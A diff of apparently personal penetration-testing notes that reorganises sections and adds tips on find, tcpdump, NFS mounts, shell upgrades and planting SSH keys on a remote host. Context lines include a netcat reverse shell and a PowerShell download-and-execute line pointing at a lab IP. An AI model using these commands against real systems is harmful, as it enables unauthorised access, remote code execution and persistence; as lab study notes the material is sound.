@@ -569,10 +569,10 @@ schtasks /query /fo LIST /v
 
 Look for `SeImpersonatePrivilege` to `Enabled` with `whoami /priv`  
 
-## Misc
+## Get shells
 
 Didn't know how to name and sort this category.  
-When I started I was struggling with downloading / uploading or executing files and scripts between my machine (kali) and the box I was attacking, now that I'm more comfortable let me share this.
+When I started I was struggling with downloading / uploading or executing files and scripts between my machine and the box I was attacking, now that I'm more comfortable let me share this.
 
 ### Hosting files on Kali
 
@@ -671,7 +671,9 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Inv
 nc 10.10.10.10 1337 -e /bin/bash
 ```
 
-### Reminders
+## Misc
+
+### Common tools
 
 - scp  
 
@@ -710,4 +712,52 @@ awk '{print $1}'
 Forward port 1234 of remote machine to port 5678 of local machine :  
 ```
 ssh -L 1234:127.0.0.1:5678 user@remote
+```
+
+- find  
+
+Search for file in current directory :  
+```
+find . -name file.txt
+```
+
+Exec command for each file found, example :  
+```
+find . -name file.txt -exec wc -c {} \;
+```
+
+- tcpdump
+
+Useful for checking if I have RCE, on Kali :  
+```
+tcpdump -i $INTERFACE icmp
+```
+And then execute `ping -c 1 $KALI_IP` on remote host.  
+
+- NFS mount  
+
+```
+mount -t nfs $HOST:/remote/path /local/path
+```
+
+### Improve shell
+
+```
+python3 -c "import pty;pty.spawn('/bin/bash')"
+ctrl Z
+stty raw echo
+fg
+export TERM=screen
+```
+
+### Export SSH keys
+
+Gen new key pair :  
+```
+ssh-keygen -t rsa
+```
+
+And then copy `id_rsa.pub` in `/home/$USER/.ssh/authorized_keys` of remote host. Then simply connect as the given user :
+```
+ssh $USER@$REMOTE_HOST
 ```
